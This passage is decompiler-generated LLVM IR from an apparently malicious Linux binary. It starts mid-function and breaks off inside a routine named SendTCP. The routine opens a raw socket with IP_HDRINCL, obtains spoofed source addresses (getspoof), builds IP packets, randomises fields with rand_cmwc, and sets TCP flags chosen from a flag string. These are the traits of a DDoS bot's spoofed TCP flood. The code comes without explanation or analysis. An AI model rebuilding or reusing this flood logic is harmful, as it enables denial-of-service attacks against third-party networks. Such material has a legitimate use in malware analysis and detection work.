  br i1 %v1_804fd8e, label %dec_label_pc_804fda6, label %dec_label_pc_804fd90

dec_label_pc_804fd90:                             ; preds = %dec_label_pc_804fd89
  %v10_804fd93 = icmp eq i8 %stack_var_-19.0, 25
  br i1 %v10_804fd93, label %dec_label_pc_804fbdb, label %dec_label_pc_804fd9b

dec_label_pc_804fd9b:                             ; preds = %dec_label_pc_804fd90
  %v10_804fd9e = icmp eq i8 %stack_var_-19.0, 94
  br i1 %v10_804fd9e, label %dec_label_pc_804fbdb, label %dec_label_pc_804fda6

dec_label_pc_804fda6:                             ; preds = %dec_label_pc_804fd89, %dec_label_pc_804fd9b
  %v11_804fda9 = icmp eq i8 %stack_var_-20.0, -44
  %v1_804fdab = icmp eq i1 %v11_804fda9, false
  br i1 %v1_804fdab, label %dec_label_pc_804fdb8, label %dec_label_pc_804fdad

dec_label_pc_804fdad:                             ; preds = %dec_label_pc_804fda6
  %v10_804fdb0 = icmp eq i8 %stack_var_-19.0, 56
  br i1 %v10_804fdb0, label %dec_label_pc_804fbdb, label %dec_label_pc_804fdb8

dec_label_pc_804fdb8:                             ; preds = %dec_label_pc_804fda6, %dec_label_pc_804fdad
  store i32 0, i32* %stack_var_-36, align 4
  %v4_804fdd4 = urem i32 %extract.t, 256
  store i32 %v4_804fdd4, i32* @edx, align 4
  %v4_804fdde = zext i8 %stack_var_-18.0 to i32
  store i32 %v4_804fdde, i32* @ecx, align 4
  store i32 %.pre53, i32* @ebx, align 4
  %v1_804fdf5 = urem i32 %v4_804fc43, 256
  store i32 ptrtoint ([12 x i8]* @global_var_80693b7.162 to i32), i32* @esi, align 4
  %v2_804fdff = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804fdff, i32* @edi, align 4
  %v7_804fe0b = call i32 @szprintf(i32 %v2_804fdff, i32 ptrtoint ([12 x i8]* @global_var_80693b7.162 to i32), i32 %v1_804fdf5, i32 %.pre53, i32 %v4_804fdde, i32 %v4_804fdd4)
  %v1_804fe1a = call i32 @inet_addr(i32 %v2_804fdff)
  %v2_804fe25 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804fe25, i32* @ebx, align 4
  store i32 %v0_804fb65, i32* @esi, align 4
  store i32 %v0_804fb64, i32* @edi, align 4
  ret i32 %v1_804fe1a

; uselistorder directives
  uselistorder i32 %v4_804fdd4, { 1, 0 }
  uselistorder i8 %stack_var_-20.0, { 0, 1, 2, 9, 3, 10, 4, 5, 6, 7, 8, 11, 12, 13, 15, 14 }
  uselistorder i8 %stack_var_-18.0, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i8 %stack_var_-19.0, { 4, 5, 6, 3, 7, 0, 8, 9, 18, 10, 11, 12, 1, 13, 17, 14, 2, 16, 15 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 ptrtoint ([12 x i8]* @global_var_80693b7.162 to i32), { 0, 6, 1, 3, 4, 5, 2 }
  uselistorder i64 255, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_804fdb8, { 1, 0 }
  uselistorder label %dec_label_pc_804fda6, { 1, 0 }
  uselistorder label %dec_label_pc_804fd1a, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804fce4, { 1, 0 }
  uselistorder label %dec_label_pc_804fc43, { 1, 0 }
  uselistorder label %dec_label_pc_804fbdb, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 19 }
}

define i32 @SendTCP() local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp65 = call i16 @__decompiler_undefined_function_2()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp67 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-20 = alloca i8*, align 4
  %tmp111 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804fe2d = load i32, i32* @edi, align 4
  %v0_804fe2e = load i32, i32* @esi, align 4
  %v0_804fe2f = load i32, i32* @ebx, align 4
  store i32 %v0_804fe2f, i32* %stack_var_-16, align 4
  %v5_804fe30 = icmp ult i32* %stack_var_-16, inttoptr (i32 220 to i32*)
  store i1 %v5_804fe30, i1* %cf.global-to-local, align 1
  %v15_804fe30 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v15_804fe30, i32* %eax.global-to-local, align 4
  %v1_804fe3b = call i32 @listFork(i32 %v15_804fe30)
  store i32 %v1_804fe3b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fe40 = icmp eq i32 %v1_804fe3b, 0
  br i1 %v1_804fe40, label %dec_label_pc_804fe49, label %dec_label_pc_80504fc

dec_label_pc_804fe49:                             ; preds = %entry
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v1_804fe52 = inttoptr i32 %tmp111 to i32*
  %v2_804fe52 = load i32, i32* %v1_804fe52, align 4
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v1_804fe5a = add i32 %tmp111, 4
  %v2_804fe5a = inttoptr i32 %v1_804fe5a to i32*
  %v3_804fe5a = load i32, i32* %v2_804fe5a, align 4
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v1_804fe63 = add i32 %tmp111, 8
  %v2_804fe63 = inttoptr i32 %v1_804fe63 to i32*
  %v3_804fe63 = load i32, i32* %v2_804fe63, align 4
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v1_804fe6c = add i32 %tmp111, 12
  %v2_804fe6c = inttoptr i32 %v1_804fe6c to i32*
  %v3_804fe6c = load i32, i32* %v2_804fe6c, align 4
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v1_804fe75 = add i32 %tmp111, 16
  %v2_804fe75 = inttoptr i32 %v1_804fe75 to i32*
  %v3_804fe75 = load i32, i32* %v2_804fe75, align 4
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v1_804fe7e = add i32 %tmp111, 20
  %v2_804fe7e = inttoptr i32 %v1_804fe7e to i32*
  %v3_804fe7e = load i32, i32* %v2_804fe7e, align 4
  store i32 %tmp111, i32* %eax.global-to-local, align 4
  %v1_804fe87 = add i32 %tmp111, 24
  %v2_804fe87 = inttoptr i32 %v1_804fe87 to i32*
  %v3_804fe87 = load i32, i32* %v2_804fe87, align 4
  store i32 %v3_804fe7e, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-92, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fe99 = icmp eq i32 %v3_804fe5a, 0
  %v1_804fe9d = icmp eq i1 %v4_804fe99, false
  br i1 %v1_804fe9d, label %dec_label_pc_804feaa, label %dec_label_pc_804fe9f

dec_label_pc_804fe9f:                             ; preds = %dec_label_pc_804fe49
  %v1_804fe9f = call i32 @rand_cmwc(i32 %v3_804fe7e)
  store i32 %v1_804fe9f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fec2

dec_label_pc_804feaa:                             ; preds = %dec_label_pc_804fe49
  %v1_804fead = urem i32 %v3_804fe5a, 65536
  store i32 %v1_804fead, i32* %eax.global-to-local, align 4
  %v0_804feb2 = load i32, i32* @esp, align 4
  %v5_804feb2 = icmp ult i32 %v0_804feb2, 12
  store i1 %v5_804feb2, i1* %cf.global-to-local, align 1
  %v1_804feb6 = call i32 @htons(i32 %v1_804fead)
  store i32 %v1_804feb6, i32* %eax.global-to-local, align 4
  %v0_804febb = load i32, i32* @esp, align 4
  %v2_804febb = icmp ugt i32 %v0_804febb, -17
  store i1 %v2_804febb, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804fec2

dec_label_pc_804fec2:                             ; preds = %dec_label_pc_804fe9f, %dec_label_pc_804feaa
  %v2_804fec5 = ptrtoint i32* %stack_var_-92 to i32
  %v5_804fec8 = icmp eq i32* %stack_var_-92, inttoptr (i32 -4 to i32*)
  store i1 %v5_804fec8, i1* %cf.global-to-local, align 1
  %v15_804fec8 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v15_804fec8, i32* %eax.global-to-local, align 4
  %v3_804fecf = call i32 @getHost(i32 %v2_804fe52, i32* nonnull %stack_var_-88)
  store i32 %v3_804fecf, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fed7 = icmp eq i32 %v3_804fecf, 0
  br i1 %v1_804fed7, label %dec_label_pc_804fee0, label %dec_label_pc_80504fc

dec_label_pc_804fee0:                             ; preds = %dec_label_pc_804fec2
  %v5_804feea = icmp ugt i32* %stack_var_-92, inttoptr (i32 -9 to i32*)
  store i1 %v5_804feea, i1* %cf.global-to-local, align 1
  %v15_804feea = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v15_804feea, i32* %eax.global-to-local, align 4
  %v3_804feee = bitcast i32* %stack_var_-84 to i8*
  %v4_804feee = call i32 @__GI_memset(i8* %v3_804feee, i32 0, i32 8)
  store i32 %v4_804feee, i32* %eax.global-to-local, align 4
  %v5_804fef6 = icmp ult i32* %stack_var_-236, inttoptr (i32 4 to i32*)
  store i1 %v5_804fef6, i1* %cf.global-to-local, align 1
  %v3_804feff = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_804feff, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ff0a = icmp eq i32 %v3_804feff, 0
  %v1_804ff0e = icmp eq i1 %v4_804ff0a, false
  br i1 %v1_804ff0e, label %dec_label_pc_804ff15, label %dec_label_pc_80504fc

dec_label_pc_804ff15:                             ; preds = %dec_label_pc_804fee0
  store i32 1, i32* %stack_var_-96, align 4
  %v5_804ff1c = icmp ult i32* %stack_var_-236, inttoptr (i32 12 to i32*)
  store i1 %v5_804ff1c, i1* %cf.global-to-local, align 1
  %v2_804ff21 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804ff21, i32* %eax.global-to-local, align 4
  %v5_804ff2c = call i32 @__GI_setsockopt(i32 %v3_804feff, i32 0, i32 3, i32 %v2_804ff21, i32 4)
  store i32 %v5_804ff2c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804ff34 = icmp slt i32 %v5_804ff2c, 0
  %v1_804ff36 = icmp eq i1 %v2_804ff34, false
  br i1 %v1_804ff36, label %dec_label_pc_804ff3d, label %dec_label_pc_80504fc

dec_label_pc_804ff3d:                             ; preds = %dec_label_pc_804ff15
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ff3d = icmp eq i32 %v3_804fe87, 0
  %v1_804ff41 = icmp eq i1 %v4_804ff3d, false
  br i1 %v1_804ff41, label %dec_label_pc_804ff4c, label %dec_label_pc_804ff62

dec_label_pc_804ff4c:                             ; preds = %dec_label_pc_804ff3d
  %v5_804ff53 = sub i32 32, %v3_804fe87
  %v10_804ff53 = icmp ugt i32 %v3_804fe87, 32
  store i1 %v10_804ff53, i1* %cf.global-to-local, align 1
  store i32 %v5_804ff53, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804ff5b = urem i32 %v5_804ff53, 32
  %v4_804ff5b = icmp eq i32 %v2_804ff5b, 0
  br i1 %v4_804ff5b, label %bb131, label %bb

bb:                                               ; preds = %dec_label_pc_804ff4c
  %v5_804ff5b = shl i32 1, %v2_804ff5b
  store i32 %v5_804ff5b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb131

bb131:                                            ; preds = %dec_label_pc_804ff4c, %bb
  %v0_804ff5d = phi i32 [ 1, %dec_label_pc_804ff4c ], [ %v5_804ff5b, %bb ]
  %v1_804ff5d = sub i32 0, %v0_804ff5d
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804ff5d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff62

dec_label_pc_804ff62:                             ; preds = %dec_label_pc_804ff3d, %bb131
  %v1_804ff65 = add i32 %v3_804fe75, 40
  %v1_804ff71 = add i32 %v3_804fe75, 70
  %v2_804ff74 = and i32 %v1_804ff71, -16
  %v2_804ff7a = sub i32 %v15_804fe30, %v2_804ff74
  %v1_804ff82 = add i32 %v2_804ff7a, 15
  %v2_804ff85 = and i32 %v1_804ff82, -16
  store i32 %v2_804ff85, i32* %edx.global-to-local, align 4
  %v1_804ff9d = add i32 %v2_804ff85, 20
  %v5_804ffa0 = inttoptr i32 %v1_804ff9d to i16*
  %v1_804ffa6 = add i32 %v3_804fe75, 20
  %v5_804ffa6 = icmp ugt i32 %v3_804fe75, -21
  store i1 %v5_804ffa6, i1* %cf.global-to-local, align 1
  store i32 %v1_804ffa6, i32* %eax.global-to-local, align 4
  store i32 %v1_804ffa6, i32* @ebx, align 4
  %v1_804ffab = call i32 @getspoof(i32 %v1_804ff65)
  store i32 %v1_804ffab, i32* %eax.global-to-local, align 4
  %v0_804ffb0 = load i32, i32* @esp, align 4
  %v5_804ffb0 = icmp ult i32 %v0_804ffb0, 12
  store i1 %v5_804ffb0, i1* %cf.global-to-local, align 1
  %v2_804ffb3 = add i32 %v0_804ffb0, -16
  %v3_804ffb3 = inttoptr i32 %v2_804ffb3 to i32*
  store i32 %v1_804ffab, i32* %v3_804ffb3, align 4
  %v2_804ffb4 = call i32 @htonl(i32 %v1_804ff9d)
  store i32 %v2_804ffb4, i32* %eax.global-to-local, align 4
  %v0_804ffb9 = load i32, i32* @esp, align 4
  %v3_804ffbc = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_804ffbc, i32* %edx.global-to-local, align 4
  %tmp = and i32 %v0_804ffb9, -4
  %v5_804ffbf = icmp eq i32 %tmp, -16
  store i1 %v5_804ffbf, i1* %cf.global-to-local, align 1
  %v0_804ffc2 = load i32, i32* @ebx, align 4
  %v2_804ffc2 = add i32 %v0_804ffb9, 8
  %v3_804ffc2 = inttoptr i32 %v2_804ffc2 to i32*
  store i32 %v0_804ffc2, i32* %v3_804ffc2, align 4
  %v1_804ffc3 = add i32 %v0_804ffb9, 4
  %v2_804ffc3 = inttoptr i32 %v1_804ffc3 to i32*
  store i32 6, i32* %v2_804ffc3, align 4
  %v3_804ffc5 = inttoptr i32 %v0_804ffb9 to i32*
  store i32 %v2_804ffb4, i32* %v3_804ffc5, align 4
  %v0_804ffc6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ffc6 = add i32 %v0_804ffb9, -4
  %v3_804ffc6 = inttoptr i32 %v2_804ffc6 to i32*
  store i32 %v0_804ffc6, i32* %v3_804ffc6, align 4
  %v5_804ffc7 = add i32 %v0_804ffb9, -8
  %v6_804ffc7 = inttoptr i32 %v5_804ffc7 to i32*
  store i32 %v2_804ff85, i32* %v6_804ffc7, align 4
  %v0_804ffca = call i32 @makeIPPacket()
  store i32 %v0_804ffca, i32* %eax.global-to-local, align 4
  %v0_804ffcf = load i32, i32* @esp, align 4
  %v5_804ffcf = icmp ugt i32 %v0_804ffcf, -25
  store i1 %v5_804ffcf, i1* %cf.global-to-local, align 1
  %v2_804ffd2 = call i32 @rand_cmwc(i32 %v1_804ff9d)
  %sext = mul i32 %v2_804ffd2, 65536
  %v1_804ffd7 = sdiv i32 %sext, 65536
  store i32 %v1_804ffd7, i32* %edx.global-to-local, align 4
  store i32 %v1_804ff9d, i32* %eax.global-to-local, align 4
  %v1_804ffdc = trunc i32 %v1_804ffd7 to i16
  store i16 %v1_804ffdc, i16* %v5_804ffa0, align 4
  %v2_804ffdf = call i32 @rand_cmwc(i32 %v1_804ff9d)
  %v2_804ffe9 = add i32 %v2_804ff85, 24
  %v3_804ffe9 = inttoptr i32 %v2_804ffe9 to i32*
  store i32 %v2_804ffdf, i32* %v3_804ffe9, align 8
  store i32 %v1_804ff9d, i32* %eax.global-to-local, align 4
  %v1_804ffef = add i32 %v2_804ff85, 28
  %v2_804ffef = inttoptr i32 %v1_804ffef to i32*
  store i32 0, i32* %v2_804ffef, align 4
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v1_804fff9 = add i32 %v2_804ff85, 32
  %v2_804fff9 = inttoptr i32 %v1_804fff9 to i8*
  %v3_804fff9 = load i8, i8* %v2_804fff9, align 16
  %v1_804fffc = urem i8 %v3_804fff9, 16
  %v1_804ffff = or i8 %v1_804fffc, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v1_804ffff, i8* %v2_804fff9, align 16
  store i32 %v3_804fe6c, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v3_804fe6c, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80699e1.193 to i32), i32* @edi, align 4
  %v5_8050023 = inttoptr i32 %v3_804fe6c to i8*
  %v6_8050023 = call i32 @_strncmp(i8* %v5_8050023, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80699e1.193, i32 0, i32 0), i32 4)
  %v7_8050023 = urem i32 %v6_8050023, 2
  %v8_8050023 = icmp eq i32 %v7_8050023, 0
  %v0_8050025 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050025 = or i1 %v0_8050025, %v8_8050023
  %v3_8050025 = zext i1 %v2_8050025 to i32
  %v4_8050025 = load i32, i32* %edx.global-to-local, align 4
  %v5_8050025 = and i32 %v4_8050025, -256
  %v6_8050025 = or i32 %v3_8050025, %v5_8050025
  %v7_8050025 = xor i32 %v6_8050025, 1
  store i32 %v7_8050025, i32* %edx.global-to-local, align 4
  %v1_805002d = trunc i32 %v7_8050025 to i8
  %v3_805002d = zext i1 %v0_8050025 to i8
  %v4_805002d = sub nsw i8 %v1_805002d, %v3_805002d
  %v15_805002d = icmp eq i8 %v4_805002d, 0
  %v2_8050031 = sext i8 %v4_805002d to i32
  store i32 %v2_8050031, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050036 = icmp eq i1 %v15_805002d, false
  br i1 %v1_8050036, label %dec_label_pc_8050085, label %dec_label_pc_8050038

dec_label_pc_8050038:                             ; preds = %dec_label_pc_804ff62
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v1_805003b = add i32 %v2_804ff85, 33
  %v2_805003b = inttoptr i32 %v1_805003b to i8*
  %v3_805003b = load i8, i8* %v2_805003b, align 1
  %v4_805003b = zext i8 %v3_805003b to i32
  %v6_805003b = and i32 %v2_8050031, -256
  %v7_805003b = or i32 %v6_805003b, %v4_805003b
  %v1_805003e = or i32 %v7_805003b, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_805003e = trunc i32 %v1_805003e to i8
  store i32 %v1_805003e, i32* %eax.global-to-local, align 4
  store i8 %v3_805003e, i8* %v2_805003b, align 1
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v3_8050047 = load i8, i8* %v2_805003b, align 1
  %v4_8050047 = zext i8 %v3_8050047 to i32
  %v5_8050047 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050047 = and i32 %v5_8050047, -256
  %v7_8050047 = or i32 %v4_8050047, %v6_8050047
  %v1_805004a = or i32 %v7_8050047, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_805004a = trunc i32 %v1_805004a to i8
  store i32 %v1_805004a, i32* %eax.global-to-local, align 4
  store i8 %v3_805004a, i8* %v2_805003b, align 1
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v3_8050053 = load i8, i8* %v2_805003b, align 1
  %v4_8050053 = zext i8 %v3_8050053 to i32
  %v5_8050053 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050053 = and i32 %v5_8050053, -256
  %v7_8050053 = or i32 %v4_8050053, %v6_8050053
  %v1_8050056 = or i32 %v7_8050053, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_8050056 = trunc i32 %v1_8050056 to i8
  store i32 %v1_8050056, i32* %eax.global-to-local, align 4
  store i8 %v3_8050056, i8* %v2_805003b, align 1
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v3_805005f = load i8, i8* %v2_805003b, align 1
  %v4_805005f = zext i8 %v3_805005f to i32
  %v5_805005f = load i32, i32* %eax.global-to-local, align 4
  %v6_805005f = and i32 %v5_805005f, -256
  %v7_805005f = or i32 %v4_805005f, %v6_805005f
  %v1_8050062 = or i32 %v7_805005f, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_8050062 = trunc i32 %v1_8050062 to i8
  store i32 %v1_8050062, i32* %eax.global-to-local, align 4
  store i8 %v3_8050062, i8* %v2_805003b, align 1
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v3_805006b = load i8, i8* %v2_805003b, align 1
  %v4_805006b = zext i8 %v3_805006b to i32
  %v5_805006b = load i32, i32* %eax.global-to-local, align 4
  %v6_805006b = and i32 %v5_805006b, -256
  %v7_805006b = or i32 %v4_805006b, %v6_805006b
  %v1_805006e = or i32 %v7_805006b, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_805006e = trunc i32 %v1_805006e to i8
  store i32 %v1_805006e, i32* %eax.global-to-local, align 4
  store i8 %v3_805006e, i8* %v2_805003b, align 1
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v3_8050077 = load i8, i8* %v2_805003b, align 1
  %v4_8050077 = zext i8 %v3_8050077 to i32
  %v5_8050077 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050077 = and i32 %v5_8050077, -256
  %v7_8050077 = or i32 %v4_8050077, %v6_8050077
  %v1_805007a = or i32 %v7_8050077, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_805007a = trunc i32 %v1_805007a to i8
  store i32 %v1_805007a, i32* %eax.global-to-local, align 4
  store i8 %v3_805007a, i8* %v2_805003b, align 1
  br label %dec_label_pc_805038c

dec_label_pc_8050085:                             ; preds = %dec_label_pc_804ff62
  store i32 %v3_804fe6c, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v3_804fe6c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80699e5.194 to i32), i32* @edi, align 4
  %v6_80500b5 = call i32 @_strncmp(i8* %v5_8050023, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80699e5.194, i32 0, i32 0), i32 5)
  %v7_80500b5 = urem i32 %v6_80500b5, 2
  %v8_80500b5 = icmp eq i32 %v7_80500b5, 0
  %v0_80500b7 = load i1, i1* %cf.global-to-local, align 1
  %v2_80500b7 = or i1 %v0_80500b7, %v8_80500b5
  %v3_80500b7 = zext i1 %v2_80500b7 to i32
  %v4_80500b7 = load i32, i32* %edx.global-to-local, align 4
  %v5_80500b7 = and i32 %v4_80500b7, -256
  %v6_80500b7 = or i32 %v3_80500b7, %v5_80500b7
  %v7_80500b7 = xor i32 %v6_80500b7, 1
  store i32 %v7_80500b7, i32* %edx.global-to-local, align 4
  %v1_80500bf = trunc i32 %v7_80500b7 to i8
  %v3_80500bf = zext i1 %v0_80500b7 to i8
  %v4_80500bf = sub nsw i8 %v1_80500bf, %v3_80500bf
  %v15_80500bf = icmp eq i8 %v4_80500bf, 0
  %v2_80500c3 = sext i8 %v4_80500bf to i32
  store i32 %v2_80500c3, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80500c8 = icmp eq i1 %v15_80500bf, false
  br i1 %v1_80500c8, label %dec_label_pc_80500f3, label %dec_label_pc_80500ca

dec_label_pc_80500ca:                             ; preds = %dec_label_pc_8050085
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v1_80500cd = add i32 %v2_804ff85, 33
  %v2_80500cd = inttoptr i32 %v1_80500cd to i8*
  %v3_80500cd = load i8, i8* %v2_80500cd, align 1
  %v4_80500cd = zext i8 %v3_80500cd to i32
  %v6_80500cd = and i32 %v2_80500c3, -256
  %v7_80500cd = or i32 %v6_80500cd, %v4_80500cd
  %v1_80500d0 = or i32 %v7_80500cd, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_80500d0 = trunc i32 %v1_80500d0 to i8
  store i32 %v1_80500d0, i32* %eax.global-to-local, align 4
  store i8 %v3_80500d0, i8* %v2_80500cd, align 1
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v3_80500d9 = load i8, i8* %v2_80500cd, align 1
  %v4_80500d9 = zext i8 %v3_80500d9 to i32
  %v5_80500d9 = load i32, i32* %eax.global-to-local, align 4
  %v6_80500d9 = and i32 %v5_80500d9, -256
  %v7_80500d9 = or i32 %v4_80500d9, %v6_80500d9
  %v1_80500dc = or i32 %v7_80500d9, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_80500dc = trunc i32 %v1_80500dc to i8
  store i32 %v1_80500dc, i32* %eax.global-to-local, align 4
  store i8 %v3_80500dc, i8* %v2_80500cd, align 1
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v3_80500e5 = load i8, i8* %v2_80500cd, align 1
  %v4_80500e5 = zext i8 %v3_80500e5 to i32
  %v5_80500e5 = load i32, i32* %eax.global-to-local, align 4
  %v6_80500e5 = and i32 %v5_80500e5, -256
  %v7_80500e5 = or i32 %v4_80500e5, %v6_80500e5
  %v1_80500e8 = or i32 %v7_80500e5, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_80500e8 = trunc i32 %v1_80500e8 to i8
  store i32 %v1_80500e8, i32* %eax.global-to-local, align 4
  store i8 %v3_80500e8, i8* %v2_80500cd, align 1
  br label %dec_label_pc_805038c

dec_label_pc_80500f3:                             ; preds = %dec_label_pc_8050085
  store i32 %v3_804fe6c, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v3_804fe6c, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80699ea.195 to i32), i32* @edi, align 4
  %v6_8050123 = call i32 @_strncmp(i8* %v5_8050023, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80699ea.195, i32 0, i32 0), i32 5)
  %v7_8050123 = urem i32 %v6_8050123, 2
  %v8_8050123 = icmp eq i32 %v7_8050123, 0
  %v0_8050125 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050125 = or i1 %v0_8050125, %v8_8050123
  %v3_8050125 = zext i1 %v2_8050125 to i32
  %v4_8050125 = load i32, i32* %edx.global-to-local, align 4
  %v5_8050125 = and i32 %v4_8050125, -256
  %v6_8050125 = or i32 %v3_8050125, %v5_8050125
  %v7_8050125 = xor i32 %v6_8050125, 1
  store i32 %v7_8050125, i32* @edx, align 4
  %v3_805012b = and i32 %v6_8050123, -256
  %v1_805012d = trunc i32 %v7_8050125 to i8
  %v3_805012d = zext i1 %v0_8050125 to i8
  %v4_805012d = sub nsw i8 %v1_805012d, %v3_805012d
  %v15_805012d = icmp eq i8 %v4_805012d, 0
  %v20_805012d = zext i8 %v4_805012d to i32
  %v23_805012d = or i32 %v20_805012d, %v3_805012b
  store i32 %v23_805012d, i32* @ecx, align 4
  %v2_8050131 = sext i8 %v4_805012d to i32
  store i32 %v2_8050131, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050136 = icmp eq i1 %v15_805012d, false
  br i1 %v1_8050136, label %dec_label_pc_8050155, label %dec_label_pc_8050138

dec_label_pc_8050138:                             ; preds = %dec_label_pc_80500f3
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v1_805013b = add i32 %v2_804ff85, 33
  %v2_805013b = inttoptr i32 %v1_805013b to i8*
  %v3_805013b = load i8, i8* %v2_805013b, align 1
  %v4_805013b = zext i8 %v3_805013b to i32
  %v6_805013b = and i32 %v2_8050131, -256
  %v7_805013b = or i32 %v6_805013b, %v4_805013b
  %v1_805013e = or i32 %v7_805013b, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_805013e = trunc i32 %v1_805013e to i8
  store i32 %v1_805013e, i32* %eax.global-to-local, align 4
  store i8 %v3_805013e, i8* %v2_805013b, align 1
  store i32 %v1_804ff9d, i32* %edx.global-to-local, align 4
  %v3_8050147 = load i8, i8* %v2_805013b, align 1
  %v4_8050147 = zext i8 %v3_8050147 to i32
  %v5_8050147 = load i32, i32* %eax.global-to-local, align 4
  %v6_8050147 = and i32 %v5_8050147, -256
  %v7_8050147 = or i32 %v4_8050147, %v6_8050147
  %v1_805014a = or i32 %v7_8050147, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_805014a = trunc i32 %v1_805014a to i8
  store i32 %v1_805014a, i32* %eax.global-to-local, align 4
  store i8 %v3_805014a, i8* %v2_805013b, align 1
  br label %dec_label_pc_805038c

dec_label_pc_8050155:                             ; preds = %dec_label_pc_80500f3
  store i32 %v3_804fe6c, i32* @eax, align 4
  %v0_8050158 = load i32, i32* @esp, align 4
  %v5_8050158 = icmp ult i32 %v0_8050158, 8
  store i1 %v5_8050158, i1* %cf.global-to-local, align 1
  %v1_805015b = add i32 %v0_8050158, -12
  %v2_805015b = inttoptr i32 %v1_805015b to i32*
  store i32 ptrtoint (i32* @global_var_80699fe.198 to i32), i32* %v2_805015b, align 4
  %v0_8050160 = load i32, i32* @eax, align 4
  %v2_8050160 = add i32 %v0_8050158, -16
  %v3_8050160 = inttoptr i32 %v2_8050160 to i32*
  store i32 %v0_8050160, i32* %v3_8050160, align 4
  %v3_8050161 = call i32 @__GI_strtok(i32 5, i32 ptrtoint ([5 x i8]* @global_var_80699ea.195 to i32))
  store i32 %v3_8050161, i32* %eax.global-to-local, align 4
  %v5_8050169 = inttoptr i32 %v3_8050161 to i8*
  store i8* %v5_8050169, i8** %stack_var_-20, align 4
